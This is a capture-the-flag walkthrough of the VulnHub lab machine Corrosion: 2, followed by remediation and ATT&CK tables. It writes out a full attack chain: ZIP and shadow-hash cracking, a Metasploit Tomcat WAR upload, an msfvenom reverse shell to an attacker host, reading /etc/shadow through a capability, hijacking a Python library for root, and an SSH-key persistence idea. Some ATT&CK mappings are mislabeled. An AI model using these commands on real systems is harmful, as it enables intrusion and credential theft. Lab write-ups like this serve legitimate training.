# Corrosion: 2

A password-protected ZIP archive sitting in a publicly accessible Tomcat directory is already giving off suspicious vibes, bruh. Crack it, find the admin credentials in `tomcat-users.xml`, and you are halfway to root before you have even run a single exploit. Corrosion: 2 is a medium-difficulty VulnHub machine that chains a credential disclosure, an authenticated Tomcat WAR upload, password reuse, a creative `look` capability abuse for shadow file reading, and finally one of the cleanest Python library hijacking examples you will see in a CTF. Legit fun chain.

---

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Corrosion: 2 (Linux, 192.168.1.186) |
| **Attacker VM** | Kali Linux (your IP) |
| **VulnHub URL** | https://www.vulnhub.com/entry/corrosion-2,477/ |
| **Techniques** | Nmap service scan, web directory brute-force, ZIP password cracking (fcrackzip), Tomcat Manager WAR upload, password reuse, Linux capability abuse (`look`), /etc/shadow hash cracking (John), sudo Python library hijacking |
| **CVEs / EDBs** | No specific CVE for authenticated Tomcat manager upload (design feature abused); CVE-2020-1938 (Ghostcat, referenced but not needed here); Python library hijacking is a misconfiguration |
| **APT Groups** | APT41 (Tomcat exploitation for initial access), G0082 APT38 (credential theft + Python abuse in targeted operations) |

---

## Attack Summary

```
[nmap] ---> ports 22 (SSH), 80 (HTTP), 8080 (Tomcat)
             |
             v
[dirb on :8080] ---> backup.zip
             |
             v
[fcrackzip + rockyou] ---> @administrator_hi5
             |
             v
[unzip backup.zip] ---> tomcat-users.xml ---> admin:melehifokivai
             |
             v
[MSF tomcat_mgr_upload] ---> WAR file ---> Meterpreter as tomcat
             |
             v
[shell + su jaye] ---> melehifokivai (password reuse) ---> jaye home
             |
             v
[./look '' /etc/shadow] ---> randy hash
             |
             v
[john + rockyou] ---> 07051986randy
             |
             v
[ssh randy] ---> sudo -l ---> NOPASSWD python3.8 randombase64.py
             |
             v
[ls -la /usr/lib/python3.8/base64.py] ---> world-writable
             |
             v
[prepend os.system("/bin/bash") to base64.py] ---> sudo python3.8 randombase64.py
             |
             v
[uid=0(root)] ---> cat /root/root.txt
```

---

## Methodology

1. Network discovery and nmap version scan across all ports
2. Web directory brute-force on port 8080 to locate the backup archive
3. ZIP password cracking with fcrackzip and rockyou wordlist
4. Credential extraction from `tomcat-users.xml` in the archive
5. Metasploit Tomcat Manager authenticated WAR upload for Meterpreter foothold
6. Lateral movement to user `jaye` via Tomcat credential reuse
7. Shadow file reading via `look` binary with elevated capabilities
8. `randy` hash cracking with John; SSH access
9. Root privilege escalation via writable Python standard library module

---

## Step 1: Network Scanning

**Context:** Target is on the local network. Full port scan to discover all services.

```bash
netdiscover -r 192.168.1.0/24
nmap -sV 192.168.1.186
```

**Expected output (condensed):**
```
22/tcp   open  ssh     OpenSSH
80/tcp   open  http    Apache httpd
8080/tcp open  http    Apache Tomcat
```

Port 8080 is the interesting one. Tomcat with an accessible manager is a classic foothold target.

**Alternative:** `nmap -sV -sC -p- 192.168.1.186` for full port coverage including non-standard ports.

**Real-world note:** Tomcat instances exposed on port 8080 without IP-based access controls are a consistent finding in enterprise environments. Developers spin up Tomcat for testing and forget to take it down or restrict access. APT41 specifically targets Tomcat manager interfaces for initial access.

**MITRE TTP:** T1046 - Network Service Scanning

---

## Step 2: Web Enumeration on Port 8080

**Context:** Default Tomcat page is shown on port 8080. Brute-force to find non-standard paths.

```bash
dirb http://192.168.1.186:8080/ -X .php,.zip
```

**Found:** `http://192.168.1.186:8080/backup.zip`

Download the archive:

```bash
wget http://192.168.1.186:8080/backup.zip
```

The archive is password-protected.

**Alternative:** `gobuster dir -u http://192.168.1.186:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x zip,bak,tar`

**Real-world note:** Password-protected archives on public web servers are a false sense of security. The archive contents are only as secure as the password protecting them. Developers should never store credential files in web-accessible directories regardless of encryption.

**MITRE TTP:** T1083 - File and Directory Discovery, T1005 - Data from Local System

---

## Step 3: Cracking the ZIP Archive

**Context:** `backup.zip` requires a password. Crack it offline with rockyou.

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```

**Expected output:**
```
PASSWORD FOUND!!!!: pw == @administrator_hi5
```

Extract the archive:

```bash
unzip backup.zip
# Password: @administrator_hi5
```

The archive contains `tomcat-users.xml` with plaintext credentials:

```xml
<user username="admin" password="melehifokivai" roles="manager-gui,admin-gui"/>
```

Credentials: `admin:melehifokivai`

**Alternative:** `zip2john backup.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`

**Real-world note:** ZIP archives containing credentials are routinely cracked in real-world engagements. The `@administrator_hi5` password is complex enough to resist casual guessing but trivially cracked by rockyou in seconds. This is why credential files should use proper secrets management, not archive encryption.

**MITRE TTP:** T1552.001 - Unsecured Credentials: Credentials in Files, T1110.003 - Brute Force: Password Cracking

---

## Step 4: Tomcat Manager WAR Upload (Initial Foothold)

**Context:** Credentials to Tomcat Manager are now known. The manager interface allows WAR file deployment, which executes arbitrary code. This is an authenticated feature abuse, not a CVE.

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.186
set RPORT 8080
set HttpUsername admin
set HttpPassword melehifokivai
set LHOST <your-attacker-ip>
run
```

**Expected output:**
```
[+] Started reverse TCP handler
[*] Uploading 6284 bytes as 3GcFkIo.war ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: tomcat
```

A Meterpreter session opens as the Tomcat service account.

**Alternative:** Manual WAR file deployment via the Tomcat Manager web UI at `http://192.168.1.186:8080/manager/html`. Create the WAR file with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war`, upload via the browser, and catch with `nc -lvnp 4444`.

**Real-world note:** Tomcat Manager authenticated WAR upload is a well-known attack vector. CISA and numerous security advisories recommend restricting Tomcat Manager to localhost (`127.0.0.1`) via the `RemoteAddrValve` configuration. This is one of the first checks in any web application penetration test targeting Java-based infrastructure. APT41 has used this technique in targeted intrusions.

**MITRE TTP:** T1190 - Exploit Public-Facing Application, T1505.003 - Web Shell

---

## Step 5: Lateral Movement to User Jaye

**Context:** Meterpreter as Tomcat service account. Check for users and attempt credential reuse.

```bash
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

List home directories:

```bash
ls /home/
# jaye  randy
```

Try the Tomcat password for user `jaye`:

```bash
su jaye
# Password: melehifokivai
id
# uid=1001(jaye)
```

Password reuse confirmed. Noice.

**Real-world note:** Service account credentials reused for user accounts are a classic pivot. Developers who configure Tomcat or other services often use the same password for their Linux user account. Always try extracted credentials against all local accounts.

**MITRE TTP:** T1078 - Valid Accounts, T1552.001 - Unsecured Credentials

---

## Step 6: Reading /etc/shadow via `look` Capability

**Context:** As user `jaye`, need to find a path to user `randy` and then to root. The `look` binary in the home directory has special capabilities set.

```bash
ls /home/jaye/
# look (binary present)

getcap /home/jaye/look
# /home/jaye/look = cap_dac_read_search+ei
```

The `cap_dac_read_search` capability allows reading any file, bypassing DAC restrictions. This means `look` can read `/etc/shadow`:

```bash
/home/jaye/look '' /etc/shadow
```

**Expected output (excerpt):**
```
randy:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET...:...
```

Copy the `randy` hash. On attacker machine, crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt randy.hash
```

**Expected output:**
```
07051986randy    (randy)
```

**Alternative:** `hashcat -m 1800 randy.hash /usr/share/wordlists/rockyou.txt -d 1` for GPU-accelerated cracking.

**Real-world note:** Linux capabilities are a lesser-known privilege escalation surface. `cap_dac_read_search` on any binary that can print file contents is equivalent to having read access to every file on the system. GTFOBins documents this exact `look` capability abuse. Check for misconfigured capabilities with `find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null` and `getcap -r / 2>/dev/null`.

**MITRE TTP:** T1548 - Abuse Elevation Control Mechanism, T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow

---

## Step 7: Privilege Escalation via Python Library Hijacking

**Context:** SSH in as `randy` and check sudo permissions.

```bash
ssh randy@192.168.1.186
# Password: 07051986randy

sudo -l
```

**Output:**
```
(root) NOPASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

The script `randombase64.py` imports the `base64` module. Locate the module:

```bash
locate base64
ls -la /usr/lib/python3.8/base64.py
# -rw-rw-rw-  ... root root ... base64.py
```

World-writable. This is the root vector. Prepend a shell spawn to the module:

```bash
nano /usr/lib/python3.8/base64.py
# Add at the VERY TOP of the file, before any existing code:
import os
os.system("/bin/bash")
```

Trigger the sudo command:

```bash
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

**Expected output:**
```
root@corrosion2:~#
id
uid=0(root)
cat /root/root.txt
```

Root shell. Absolutely rekt. GG.

**Alternative:** Instead of a shell spawn, write a Python payload that adds your SSH public key to `/root/.ssh/authorized_keys` for persistence without a TTY.

**Real-world note:** Python library hijacking is a real-world finding that appears in both CTFs and actual penetration tests. When a Python script runs with elevated privileges (via sudo, setuid, or cron) and imports from a writable location, the attacker controls code execution. The fix is to restrict write access to all Python standard library paths with `chown root:root /usr/lib/python3.8/*.py && chmod 644 /usr/lib/python3.8/*.py`.

This exact technique has been used by threat actors in targeted intrusions where they compromised a low-privileged account and found a sudo Python interpreter. Audit your Python library permissions in production.

**MITRE TTP:** T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking, T1059.006 - Command and Scripting Interpreter: Python, T1548.003 - Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Source |
|---|---|---|
| ZIP archive password | `@administrator_hi5` | fcrackzip + rockyou |
| Tomcat admin credentials | `admin:melehifokivai` | tomcat-users.xml in backup.zip |
| Lateral movement creds | `jaye:melehifokivai` | Password reuse |
| randy shadow hash | `$6$Tb/euwmK$...` | /etc/shadow via `look` capability |
| randy password | `07051986randy` | John + rockyou |
| Root flag | See /root/root.txt | Python library hijacking |

---

## Lessons Learned

| Finding | Impact | Real-World Relevance |
|---|---|---|
| Backup archive exposed on web server | Credential disclosure via offline cracking | Sensitive archives should never be in web-accessible directories; use secrets management |
| Weak ZIP password (`@administrator_hi5`) | Archive cracked in seconds with rockyou | ZIP encryption provides weak protection; do not store credential files in archives |
| Tomcat Manager accessible from network | Authenticated WAR upload = RCE | Restrict Tomcat Manager to localhost via `RemoteAddrValve`; apply network-level controls |
| Password reuse (Tomcat admin = Linux user) | Instant lateral movement without exploitation | Enforce unique credentials per service; credential managers prevent this trivially |
| `look` binary with `cap_dac_read_search` | Read any file on system, including /etc/shadow | Audit Linux capabilities with `getcap -r /`; never grant DAC-bypass capabilities to utility binaries |
| Writable Python standard library | Full root code execution via sudo Python script | Protect Python library paths with strict ownership and permissions; avoid granting sudo to Python interpreters |

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Valid Accounts | T1078 | Lateral Movement |
| Command and Scripting Interpreter: Python | T1059.006 | Execution |
| Scheduled Task/Job (sudo) | T1053 | Privilege Escalation |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Privilege Escalation |
| Hijack Execution Flow: Python Library | T1574.006 | Privilege Escalation |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Brute Force: Password Cracking | T1110.003 | Credential Access |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| OS Credential Dumping: /etc/shadow | T1003.008 | Credential Access |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|---|---|---|
| PR.DS-1 | Data at Rest Protection | Remove sensitive archives from web-accessible directories; use a dedicated secrets manager |
| PR.AC-3 | Remote Access Management | Restrict Tomcat Manager to localhost or trusted IPs; disable manager in production |
| DE.CM-7 | Monitoring for Unauthorized Activity | Alert on writes to Python standard library paths; monitor sudo Python invocations |
| ID.AM-2 | Software Asset Management | Inventory all internet-facing services; flag Tomcat Manager instances accessible from untrusted networks |

### NIST SP 800-53

| Control | Description |
|---|---|
| SC-28 | Protection of Information at Rest (use proper secrets management, not archive encryption, for credential files) |
| AC-17 | Remote Access (restrict Tomcat Manager to trusted hosts; apply RemoteAddrValve configuration) |
| AC-6 | Least Privilege (restrict Linux capabilities; never grant `cap_dac_read_search` to general-purpose utilities) |
| CM-6 | Configuration Settings (set correct ownership/permissions on Python standard library files) |
| IA-5 | Authenticator Management (enforce unique passwords per service; prohibit credential reuse) |

### CISA KEV / Known Exploited Vectors

Tomcat Manager authenticated WAR upload is documented in CISA advisories for Apache Tomcat (see CVE-2017-12617 and related advisories). Python library hijacking via writable modules is documented in CISA's Linux hardening guidance and NSA/CISA joint advisory on commonly exploited Linux misconfigurations. The `look` capability abuse maps to the broader category of Linux capability misuse documented in CISA advisory AA21-265A.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Current Maturity | Target Maturity | Gap |
|---|---|---|---|
| Asset, Change, and Configuration Management | MIL0 (no inventory of web-accessible archives; no Python library permission baseline) | MIL2 | Automated web directory scanning; CIS benchmark for Python library permissions |
| Threat and Vulnerability Management | MIL0 (no scanning of Tomcat Manager exposure) | MIL2 | Monthly authenticated scans; network segmentation assessment |
| Identity and Access Management | MIL0 (credential reuse, no service account isolation) | MIL2 | Enforce unique credentials per service; implement PAM-based controls |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|---|---|---|
| File Content Policies | D3-FCOP | Prevent writes to Python standard library paths |
| Process Spawn Analysis | D3-PSA | Detect Python spawning shells from standard library import context |
| Network Traffic Filtering | D3-NTF | Block external access to Tomcat Manager port 8080 |
| Credential Hardening | D3-CH | Enforce unique strong passwords; prohibit credential reuse |
| System Call Filtering | D3-SCF | Restrict capability assignments to binaries using seccomp or AppArmor |

---

## Final Thoughts

Corrosion: 2 is a wonderfully instructive box because it demonstrates that real-world compromises rarely depend on CVE exploitation. Every single step here is a configuration failure: a backup archive in the wrong place, a weak ZIP password, Tomcat Manager exposed to the network, a reused password, a capability on the wrong binary, and world-writable Python libraries. None of these individually scream "critical," but chained together they produce a full root compromise from a single exposed port.

The Python library hijacking step is the highlight of this box, fr fr. It is clean, elegant, and directly applicable to real engagements. Whenever you see `sudo python3 <script>` in a `sudo -l` output, your first question should be: "What does this script import, and are those modules writable?" The answer is often more interesting than you expect.

Thanks guys!! (❍ᴥ❍ʋ)
